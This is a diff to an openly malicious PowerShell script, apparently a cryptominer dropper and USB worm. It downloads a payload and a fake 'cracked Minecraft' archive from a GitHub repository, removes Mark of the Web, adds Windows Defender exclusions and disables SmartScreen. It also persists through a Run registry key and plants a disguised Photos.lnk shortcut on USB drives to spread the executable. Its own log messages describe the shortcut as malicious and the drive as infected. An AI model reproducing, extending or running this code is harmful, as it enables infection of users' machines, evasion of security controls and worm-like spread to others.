@@ -5,6 +5,7 @@ $logDirectory = Split-Path -Path $logPath -Parent
 
 if (-not (Test-Path -Path $logDirectory)) {
     New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
+    Add-Content -Path $logPath -Value "Created log directory: $logDirectory"
 }
 
 Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account."
@@ -22,10 +23,10 @@ if (Is-Admin) {
 
 $payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
 $payloadPath = "C:\Windows\Temp\updater.exe"
-$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/Minecraft.zip"  
+$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/Minecraft.zip"
 $crackedSoftwareZipPath = "C:\Windows\Temp\cracked_software.zip"
 $crackedSoftwareFolder = "C:\Windows\Temp\CrackedSoftware"
-$crackedSoftwareExe = "$crackedSoftwareFolder\MineCraft_AutoInstaller"
+$crackedSoftwareExe = "$crackedSoftwareFolder\MineCraft_AutoInstaller.exe"
 
 Add-Content -Path $logPath -Value "Checking for existing updater.exe at $payloadPath."
 
@@ -58,6 +59,54 @@ if (Test-Path -Path $payloadPath) {
     }
 } else {
     Add-Content -Path $logPath -Value "No existing updater.exe found at $payloadPath. Proceeding with installation process without execution."
+
+    Add-Content -Path $logPath -Value "Checking for existing CrackedSoftware folder at $crackedSoftwareFolder."
+    if (-not (Test-Path -Path $crackedSoftwareFolder)) {
+        Add-Content -Path $logPath -Value "CrackedSoftware folder not found. Downloading from $crackedSoftwareZipUrl..."
+
+        try {
+            if (-not (Test-Path -Path (Split-Path -Path $crackedSoftwareZipPath -Parent))) {
+                New-Item -ItemType Directory -Path (Split-Path -Path $crackedSoftwareZipPath -Parent) -Force | Out-Null
+                Add-Content -Path $logPath -Value "Created directory for cracked software zip: $(Split-Path -Path $crackedSoftwareZipPath -Parent)."
+            }
+
+            $zipResponse = Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -PassThru
+            Add-Content -Path $logPath -Value "Cracked software zip downloaded to $crackedSoftwareZipPath. Content-Type: $($zipResponse.Headers['Content-Type'])"
+
+            if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
+                throw "Downloaded zip file not found at $crackedSoftwareZipPath."
+            }
+
+            try {
+                Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
+                Add-Content -Path $logPath -Value "Extracted cracked software to $crackedSoftwareFolder."
+            } catch {
+                Add-Content -Path $logPath -Value "Failed to extract cracked software zip: $_"
+                throw "Extraction failed."
+            }
+
+            if (-not (Test-Path -Path $crackedSoftwareExe)) {
+                Add-Content -Path $logPath -Value "Warning: MineCraft_AutoInstaller.exe not found in $crackedSoftwareFolder."
+                throw "Cracked software executable missing."
+            }
+
+            try {
+                Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
+                Add-Content -Path $logPath -Value "Removed Mark of the Web from files in $crackedSoftwareFolder."
+            } catch {
+                Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $crackedSoftwareFolder files: $_"
+            }
+        } catch {
+            Add-Content -Path $logPath -Value "Failed to download or process cracked software zip: $_"
+        }
+    } else {
+        Add-Content -Path $logPath -Value "CrackedSoftware folder already exists at $crackedSoftwareFolder."
+        if (-not (Test-Path -Path $crackedSoftwareExe)) {
+            Add-Content -Path $logPath -Value "Warning: MineCraft_AutoInstaller.exe not found in $crackedSoftwareFolder."
+        } else {
+            Add-Content -Path $logPath -Value "Confirmed: MineCraft_AutoInstaller.exe exists in $crackedSoftwareFolder."
+        }
+    }
 
     Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready..."
     $maxAttempts = 20
@@ -103,7 +152,7 @@ if (Test-Path -Path $payloadPath) {
 
     $exclusionsProcesses = @(
         "updater.exe",
-        "crackedsoftware.exe",
+        "MineCraft_AutoInstaller.exe",
         "cmd.exe",
         "powershell.exe"
     )
@@ -166,7 +215,7 @@ if (Test-Path -Path $payloadPath) {
 
     Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."
 
-    Add-Content -Path $logPath -Value "Attempting to disable SmartScreen and fetch payloads..."
+    Add-Content -Path $logPath -Value "Attempting to disable SmartScreen and fetch updater.exe..."
 
     try {
         $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
@@ -211,48 +260,15 @@ if (Test-Path -Path $payloadPath) {
             Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
         }
 
-        Add-Content -Path $logPath -Value "Downloading cracked software folder from $crackedSoftwareZipUrl..."
-        if (-not (Test-Path -Path (Split-Path -Path $crackedSoftwareZipPath -Parent))) {
-            New-Item -ItemType Directory -Path (Split-Path -Path $crackedSoftwareZipPath -Parent) -Force | Out-Null
-            Add-Content -Path $logPath -Value "Created directory for cracked software zip: $(Split-Path -Path $crackedSoftwareZipPath -Parent)."
-        }
-
-        $zipResponse = Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -PassThru
-        Add-Content -Path $logPath -Value "Cracked software zip downloaded to $crackedSoftwareZipPath. Content-Type: $($zipResponse.Headers['Content-Type'])"
-
-        if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
-            throw "Downloaded zip file not found at $crackedSoftwareZipPath."
-        }
-
-        try {
-            Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
-            Add-Content -Path $logPath -Value "Extracted cracked software to $crackedSoftwareFolder."
-        } catch {
-            Add-Content -Path $logPath -Value "Failed to extract cracked software zip: $_"
-            throw "Extraction failed."
-        }
-
-        if (-not (Test-Path -Path $crackedSoftwareExe)) {
-            Add-Content -Path $logPath -Value "Warning: crackedsoftware.exe not found in $crackedSoftwareFolder."
-            throw "Cracked software executable missing."
-        }
-
-        try {
-            Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
-            Add-Content -Path $logPath -Value "Removed Mark of the Web from files in $crackedSoftwareFolder."
-        } catch {
-            Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $crackedSoftwareFolder files: $_"
-        }
-
-        Add-Content -Path $logPath -Value "Payloads downloaded successfully but not executed, as per configuration."
+        Add-Content -Path $logPath -Value "Updater.exe downloaded successfully but not executed, as per configuration."
 
     } catch {
-        Add-Content -Path $logPath -Value "Failed to fetch payloads. Error: $_"
+        Add-Content -Path $logPath -Value "Failed to fetch updater.exe from $payloadUrl. Error: $_"
     }
 }
 
-# Setup Registry Key for USB Monitoring
-Add-Content -Path $logPath -Value "Setting up registry key for USB monitoring..."
+# Check and Setup Registry Key for USB Monitoring
+Add-Content -Path $logPath -Value "Checking registry key for USB monitoring..."
 
 try {
     $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
@@ -260,14 +276,19 @@ try {
     $scriptPath = $PSCommandPath
     $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
 
-    if (-not (Test-Path $regPath)) {
-        New-Item -Path $regPath -Force | Out-Null
+    $regExists = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
+    if ($regExists -and $regExists.USBMonitor -eq $command) {
+        Add-Content -Path $logPath -Value "Registry key already exists and correctly configured: $regPath\$regName"
+    } else {
+        if (-not (Test-Path $regPath)) {
+            New-Item -Path $regPath -Force | Out-Null
+            Add-Content -Path $logPath -Value "Created registry path: $regPath"
+        }
+        Set-ItemProperty -Path $regPath -Name $regName -Value $command -ErrorAction Stop
+        Add-Content -Path $logPath -Value "Registry key set or updated: $regPath\$regName"
     }
-
-    Set-ItemProperty -Path $regPath -Name $regName -Value $command -ErrorAction Stop
-    Add-Content -Path $logPath -Value "Registry key added: $regPath\$regName"
 } catch {
-    Add-Content -Path $logPath -Value "Failed to add registry key for USB monitoring: $_"
+    Add-Content -Path $logPath -Value "Failed to check or set registry key for USB monitoring: $_"
 }
 
 # Monitor and Infect USB Drives
@@ -315,12 +336,11 @@ function Infect-USB {
         # Create malicious shortcut (Photos.lnk)
         $shell = New-Object -ComObject WScript.Shell
         $shortcut = $shell.CreateShortcut($lnkPath)
-        $shortcut.TargetPath = "$usbSoftwareFolder\crackedsoftware.exe"
+        $shortcut.TargetPath = "$usbSoftwareFolder\MineCraft_AutoInstaller.exe"
         $shortcut.IconLocation = "%SystemRoot%\system32\shell32.dll,4"  # Folder icon
         $shortcut.WorkingDirectory = $usbSoftwareFolder
         $shortcut.Save()
-        Add-Content -Path $logPath -Value "Created malicious shortcut at $lnkPath pointing to $usbSoftwareFolder\crackedsoftware.exe"
-
+        Add-Content -Path $logPath -Value "Created malicious shortcut at $lnkPath pointing to $usbSoftwareFolder\MineCraft_AutoInstaller.exe"
     } catch {
         Add-Content -Path $logPath -Value "Failed to infect USB at $usbPath. Error: $_"
     }
